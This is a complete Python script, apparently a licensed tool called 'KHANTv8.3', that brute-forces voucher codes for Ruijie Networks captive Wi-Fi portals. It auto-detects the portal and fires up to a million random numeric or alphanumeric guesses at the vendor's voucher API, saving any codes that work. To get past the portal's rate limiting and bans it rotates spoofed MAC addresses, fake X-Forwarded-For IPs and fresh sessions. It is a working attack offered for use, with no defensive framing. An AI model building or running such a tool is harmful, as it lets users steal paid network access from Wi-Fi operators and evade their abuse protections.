#!/usr/bin/env python3
"""
Ruijie Voucher Scanner - KHANTv8.3 (Part 1)
- Single-Device Hardware Bound License (Anti-Sharing)
- Real-Time Hit Engine & Hit Plan Enabled
"""

import os
import sys
import json
import asyncio
import aiohttp
import time
import socket
import requests
import urllib3
import random
import string
import hashlib
import platform
from datetime import datetime
from urllib.parse import urlparse, parse_qs, quote

from rich.console import Console
from rich.layout import Layout
from rich.panel import Panel
from rich.live import Live
from rich.table import Table
from rich.align import Align
from rich.text import Text
from rich.box import ROUNDED

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

RL_SLEEP = 0.1
CONCURRENCY = 10
console = Console()

# ==========================================
# 🔑 LICENSE & DEVICE BINDING FUNCTIONS
# ==========================================
def get_device_id():
    """စက်ပစ္စည်း (ဖုန်း/Device) တစ်ခုချင်းစီ၏ Unique ID ကို ထုတ်ယူခြင်း"""
    try:
        node_info = str(platform.node()) + str(platform.machine()) + str(platform.processor())
        base_id = node_info + os.environ.get('USER', 'user')
        device_hash = hashlib.sha256(base_id.encode()).hexdigest()[:16].upper()
        return device_hash
    except:
        return "KHANT-DEVICE-GEN"

def generate_key_for_device(device_id):
    """Device ID အတွက် သီးသန့် Key ဖန်တီးပေးရန် (မျှဝေ၍မရပါ)"""
    secret_salt = "KHANTv8.3_SECURE_SALT"
    raw = device_id + secret_salt
    key_hash = hashlib.sha256(raw.encode()).hexdigest().upper()
    return f"KHANT-{key_hash[:4]}-{key_hash[4:8]}-{key_hash[8:12]}"

def verify_license():
    os.system('cls' if os.name == 'nt' else 'clear')
    my_device_id = get_device_id()
    
    console.print(Panel(
        Align.center(
            Text("🔒 KHANTv8.3 - DEVICE LICENSE VERIFICATION", style="bold red") + "\n\n" +
            Text(f"Your Device ID: {my_device_id}", style="bold yellow") + "\n" +
            Text("This key is locked to this device exclusively.", style="dim")
        ),
        border_style="red",
        box=ROUNDED
    ))
    
    entered_key = input("\n[yellow]>> Enter Your License Key: [/yellow]").strip()
    expected_key = generate_key_for_device(my_device_id)
    
    if entered_key == expected_key:
        console.print("[bold green][+] ✅ License Verified Successfully for this Device![/bold green]")
        time.sleep(1.5)
    else:
        console.print("[bold red][-] ❌ Invalid Key or This Key belongs to another device! Access Denied.[/bold red]")
        time.sleep(2)
        sys.exit(1)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    clear_screen()
    console.print(Panel(
        Align.center(
            Text("KHANTv8.3 RUIJIE SCANNER", style="bold magenta") + "\n" +
            Text("Hit Plan Enabled | Real-Time Engine", style="bold yellow")
        ), 
        border_style="cyan", 
        box=ROUNDED
    ))
    console.print()

def get_gateway_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        parts = ip.split('.')
        parts[-1] = '1'
        return '.'.join(parts)
    except:
        return "192.168.110.1"

def extract_params_from_url(url):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    params = {}
    mapping = {
        'gw_id': 'gw_id', 'gw_sn': 'gw_sn', 'gw_address': 'gw_address',
        'gw_port': 'gw_port', 'ip': 'ip', 'mac': 'mac', 'slot_num': 'slot_num',
        'nasip': 'nasip', 'ssid': 'ssid', 'url': 'url', 'chap_id': 'chap_id',
        'chap_challenge': 'chap_challenge'
    }
    for key, mk in mapping.items():
        if key in query:
            params[mk] = query[key][0]
    if 'RES' in query:
        params['RES'] = query['RES'][0]
    return params

def get_timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def auto_detect_portal():
    console.print(Panel(
        Align.center(Text("AUTO DETECTING PORTAL URL...", style="bold cyan")),
        border_style="cyan", box=ROUNDED
    ))
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'})
    
    TEST_URL = "http://connectivitycheck.gstatic.com/generate_204"
    try:
        r = session.get(TEST_URL, allow_redirects=True, timeout=5)
        if "ruijienetworks" in r.url:
            return r.url
    except:
        pass

    gateways = [get_gateway_ip(), "192.168.110.1", "192.168.0.1", "10.44.77.254", "192.168.1.1"]
    for gw in list(dict.fromkeys(gateways)):
        try:
            res = session.get(f"http://{gw}", timeout=5, allow_redirects=True)
            if "ruijienetworks" in res.url:
                return res.url
        except:
            pass
    return None
class VoucherScanner:
    def __init__(self):
        self.sid = None
        self.sign = None
        self.timestamp = None
        self.session_valid = False
        self.rate_limited = False
        self.mode = "num"
        
        self.current_mac = self.gen_random_mac()
        self.current_ip = f"192.168.110.{random.randint(2, 254)}"

        self._display_active = False
        self._live = None
        self._state = {
            'phase': '', 'conc': CONCURRENCY, 'batch': 1,
            'total': 0, 'checked': 0, 'speed': 0, 'percentage': 0,
            'found': [], 'valid': [], 'status': None, 'session': None, 'current_code': ''
        }

        self.params = {
            "stage": "portal", "gw_id": "c4b25be7d323", "gw_sn": "H1U320P00210A",
            "gw_address": "192.168.7.1", "gw_port": "2060", "ip": self.current_ip,
            "mac": self.current_mac, "slot_num": "14", "nasip": "192.168.1.193",
            "ssid": "VLAN7", "ustate": "0", "mac_req": "1",
            "url": "http://connectivitycheck.gstatic.com/generate_204",
            "chap_id": r"\245", "chap_challenge": r"\124\275\237\157\043\371\050\266\227\342\155\205\324\112\266\067"
        }

    def apply_params_from_url(self, url):
        params = extract_params_from_url(url)
        for key, value in params.items():
            if key in self.params:
                self.params[key] = value
        self.params['mac'] = self.current_mac
        self.params['ip'] = self.current_ip

    def print_progress_bar(self, percentage, width=30):
        filled = int(width * percentage / 100)
        return '#' * filled + '-' * (width - filled)

    def gen_random_mac(self):
        mac = [0x00, 0x16, 0x3e, random.randint(0x00, 0x7f), random.randint(0x00, 0xff), random.randint(0x00, 0xff)]
        return ':'.join(map(lambda x: "%02x" % x, mac))

    def generate_voucher(self, length):
        if self.mode == "num":
            return str(random.randint(0, 10**length - 1)).zfill(length)
        elif self.mode == "eng":
            return ''.join(random.choices(string.ascii_lowercase, k=length))
        elif self.mode == "mix":
            return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
        return str(random.randint(0, 10**length - 1)).zfill(length)

    def make_layout(self):
        s = self._state
        layout = Layout()
        layout.split_column(
            Layout(name="header", size=4),
            Layout(name="live", size=3),
            Layout(name="logs", ratio=1),
            Layout(name="hits", ratio=1),
        )

        title = Text("KHANTv8.3 - RUIJIE REAL-HITS SCANNER", style="bold magenta", justify="center")
        sub = Text(f"MAC: {self.current_mac[-8:]} | IP: {self.current_ip[-3:]}", style="bold yellow", justify="center")
        layout["header"].update(Panel(Align.center(Text.assemble(title, "\n", sub)), border_style="cyan", box=ROUNDED))

        status_text = Text(s['status'], style="bold yellow") if s['status'] else Text("Active", style="bold green")

        live_grid = Table.grid(padding=0, expand=True)
        live_grid.add_column(ratio=3)
        live_grid.add_column(ratio=2)
        live_grid.add_column(ratio=2)
        live_grid.add_column(ratio=2)
        live_grid.add_row(
            Panel(Align.center(Text(s['current_code'], style="bold green")), title="Code", border_style="green", box=ROUNDED),
            Panel(Align.center(Text(f"{s['checked']:,}/{s['total']:,}", style="bold cyan")), title="Checked", border_style="cyan", box=ROUNDED),
            Panel(Align.center(Text(f"{s['speed']:,}/min", style="bold yellow")), title="Speed", border_style="yellow", box=ROUNDED),
            Panel(Align.center(status_text), title="Status", border_style="magenta", box=ROUNDED),
        )
        layout["live"].update(live_grid)

        log_text = Text()
        log_text.append(f"Session: {s['session'][:15] if s['session'] else 'None'}...\n")
        log_text.append(f"Progress: [{self.print_progress_bar(s['percentage'])}] {s['percentage']:.2f}%\n")
        layout["logs"].update(Panel(log_text, title="Progress & Hit Plan", border_style="blue", box=ROUNDED))

        hits_table = Table(show_header=True, header_style="bold magenta", expand=True, box=ROUNDED)
        hits_table.add_column("Type", width=8, justify="center")
        hits_table.add_column("Voucher", justify="center")
        
        for v in s['found']: hits_table.add_row("[bold green]FOUND[/bold green]", v)
        for v in s['valid']: hits_table.add_row("[green]VALID[/green]", v)
        if not s['found'] and not s['valid']: hits_table.add_row("", "[dim]No real hits yet...[/dim]")

        layout["hits"].update(Panel(hits_table, title=f"Real Hits Plan (F: {len(s['found'])} | V: {len(s['valid'])})", border_style="yellow", box=ROUNDED))
        return layout

    def _render(self):
        if not self._display_active: return
        try: self._live.update(self.make_layout())
        except: pass

    async def get_session_id(self, session, force_refresh=False):
        if not force_refresh and self.sid and self.session_valid:
            return self.sid

        base_url = "https://portal-as.ruijienetworks.com/api/auth/wifidog"
        attempt = 0
        while attempt < 5:
            attempt += 1
            if self.rate_limited or attempt > 2:
                self.current_mac = self.gen_random_mac()
                self.current_ip = f"192.168.110.{random.randint(2, 254)}"
                self.rate_limited = False

            temp_params = self.params.copy()
            temp_params['mac'] = self.current_mac
            temp_params['ip'] = self.current_ip

            params_str = "&".join([f"{k}={quote(str(v))}" for k, v in temp_params.items()])
            full_url = f"{base_url}?{params_str}"

            headers = {
                'User-Agent': f'Mozilla/5.0 (Linux; Android 14) KHANTv8.3-{self.current_mac}',
                'Client-Mac': self.current_mac,
                'X-Forwarded-For': self.current_ip,
                'Connection': 'close'
            }

            try:
                session.cookie_jar.clear()
                async with session.get(full_url, headers=headers, timeout=10, allow_redirects=False) as resp:
                    location = resp.headers.get('Location', '')
                    if not location:
                        await asyncio.sleep(RL_SLEEP)
                        continue

                    if "request limited" in location.lower() or "banned" in location.lower():
                        self.rate_limited = True
                        await asyncio.sleep(RL_SLEEP)
                        continue

                    query = parse_qs(urlparse(location).query)
                    sid = query.get('sessionId', [None])[0]
                    if sid:
                        self.sid = sid
                        self.sign = query.get('sign', [None])[0]
                        self.timestamp = query.get('timestamp', [None])[0]
                        self.session_valid = True
                        self._state['session'] = sid
                        self._render()
                        return sid
                    await asyncio.sleep(RL_SLEEP)
            except:
                await asyncio.sleep(RL_SLEEP)
        return None

    async def validate_voucher(self, session, voucher):
        if not await self.get_session_id(session, force_refresh=False):
            return 'RATE_LIMITED', None, "No session"

        url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
        if self.sign and self.timestamp:
            url += f"&sign={self.sign}&timestamp={self.timestamp}"

        headers = {
            "content-type": "application/json",
            "user-agent": "Mozilla/5.0 (Linux; Android 12)",
            "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={self.sid}",
        }

        for _ in range(1, 4):
            payload = {"accessCode": voucher, "sessionId": self.sid, "apiVersion": 1}
            if self.sign: payload["sign"] = self.sign
            if self.timestamp: payload["timestamp"] = self.timestamp

            try:
                async with session.post(url, json=payload, headers=headers, ssl=False, timeout=10, allow_redirects=True) as resp:
                    text = await resp.text()
                    try: result = json.loads(text)
                    except: result = {}

                    message = str(result.get("message", "")).lower()

                    if "request limited" in message or "too many" in message:
                        self.session_valid = False
                        self.rate_limited = True
                        return 'RATE_LIMITED', None, message

                    if "session timed out" in message or "invalid session" in message:
                        self.session_valid = False
                        await self.get_session_id(session, force_refresh=True)
                        continue

                    if result.get("success") is True and isinstance(result.get("result"), dict):
                        logon_url = result["result"].get("logonUrl")
                        return ('FOUND', logon_url, "Valid") if logon_url else ('VALID', None, "Valid")
                    
                    if '"result":0' in text or '"error":null' in text:
                        logon_url = result.get("result", {}).get("logonUrl") if isinstance(result.get("result"), dict) else None
                        return ('FOUND', logon_url, "Valid") if logon_url else ('VALID', None, "Valid")

                    return 'INVALID', None, message
            except:
                self.session_valid = False
                await asyncio.sleep(0.2)
        return 'INVALID', None, "Max retries"

    def save_found(self, voucher: str, status: str, logon_url: str = ""):
        ts = get_timestamp()
        with open("found_khant_v8.3.txt", "a") as f:
            if status == "FOUND": f.write(f"[{ts}] {voucher} -> {logon_url}\n")
            elif status == "VALID": f.write(f"[{ts}] {voucher} -> VALID\n")

    async def run_phase(self, session, total_codes, length):
        self._state.update({
            'total': total_codes, 'checked': 0, 'speed': 0, 'percentage': 0,
            'session': self.sid, 'current_code': '----'
        })
        self._display_active = True
        self._live = Live(self.make_layout(), refresh_per_second=10, screen=True)
        self._live.start()

        start_time = time.time()
        tested_count = 0
        semaphore = asyncio.Semaphore(CONCURRENCY)

        async def bounded_check(v):
            async with semaphore:
                res = await self.validate_voucher(session, v)
                return v, res

        try:
            batch = []
            for _ in range(total_codes):
                voucher = self.generate_voucher(length)
                batch.append(voucher)

                if len(batch) >= CONCURRENCY:
                    results = await asyncio.gather(*(bounded_check(v) for v in batch))
                    
                    for v, res in results:
                        tested_count += 1
                        status, logon_url, _ = res
                        
                        if status in ['FOUND', 'VALID']:
                            self._state['found' if status == 'FOUND' else 'valid'].append(v)
                            self.save_found(v, status, logon_url)
                            self.session_valid = False
                            await self.get_session_id(session, force_refresh=True)

                    self._state['current_code'] = batch[-1]
                    self._state['checked'] = tested_count
                    elapsed = time.time() - start_time
                    self._state['speed'] = int(tested_count / elapsed * 60) if elapsed > 0 else 0
                    self._state['percentage'] = (tested_count / total_codes) * 100
                    self._render()
                    batch.clear()
        finally:
            self._display_active = False
            self._live.stop()
            console.print(f"\n[bold green]SCAN FINISHED & HIT PLAN EXECUTED![/bold green]")

async def main():
    # 🔑 Device License Check First (Anti-Sharing)
    verify_license()

    show_banner()
    scanner = VoucherScanner()

    portal_url = auto_detect_portal()
    if portal_url:
        scanner.apply_params_from_url(portal_url)
        console.print(f"[bold green][+][/bold green] URL fetched successfully!")
    else:
        url_input = input("[yellow]>> Paste Portal URL: [/yellow]").strip()
        if not url_input: return
        scanner.apply_params_from_url(url_input)

    async with aiohttp.ClientSession() as session:
        console.print(Panel(
            Text("Choose Scan Type (Hit Plan):\n  1. NUM (0-9)\n  2. ENG (a-z)\n  3. MIX (a-z + 0-9)", style="cyan"),
            border_style="cyan", box=ROUNDED
        ))
        scan_type = input("[yellow]>> [/yellow]").strip()
        if scan_type == "2": scanner.mode = "eng"
        elif scan_type == "3": scanner.mode = "mix"
        else: scanner.mode = "num"

        lc = input("[yellow]>> Voucher length (6/7/8) [6]: [/yellow]").strip()
        length = int(lc) if lc in ['7', '8'] else 6
        
        total_p1 = 100000 if length == 6 else (500000 if length == 7 else 1000000)
        await scanner.run_phase(session, total_p1, length)

    input("[blue][*][/blue] Press Enter to exit...")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("\n[bold yellow]Interrupted by user[/bold yellow]")
    except Exception as e:
        console.print(f"[bold red]Error: {e}[/bold red]")
